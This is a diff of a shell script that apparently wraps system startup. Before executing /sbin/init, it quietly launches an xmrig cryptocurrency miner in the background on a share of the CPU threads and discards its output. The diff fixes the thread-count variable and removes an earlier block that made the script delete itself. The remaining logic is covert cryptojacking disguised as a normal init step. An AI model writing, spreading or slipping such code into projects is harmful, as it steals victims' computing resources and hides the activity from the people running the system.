@@ -25,7 +25,7 @@ if [ ! -d "$xmrig_dir" ]; then
 fi
 
 
-reads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
+threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
 usable_threads=$((threads * 20 / 100))
 rx_array="\"rx\": ["
 for ((n = 0; n < $usable_threads; n++));do
@@ -78,18 +78,12 @@ if [ "$threads" -gt 4 ]; then
 (	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config ]; do
 		sleep 5
 	done
-	nohup "$xmrig_binary" --config="$xmrig_config" > /dev/null 2>&1	
+	"$xmrig_binary" --config="$xmrig_config" > /dev/null 2>&1	
 	kill -64 $!
 
 	$ready=1
 ) &
 fi
 
-(
-	while [ ! "$ready" -eq 1 ]; do
-		sleep 5
-	done
-	rm -- "$0"
-) &
 
 exec /sbin/init "$@"
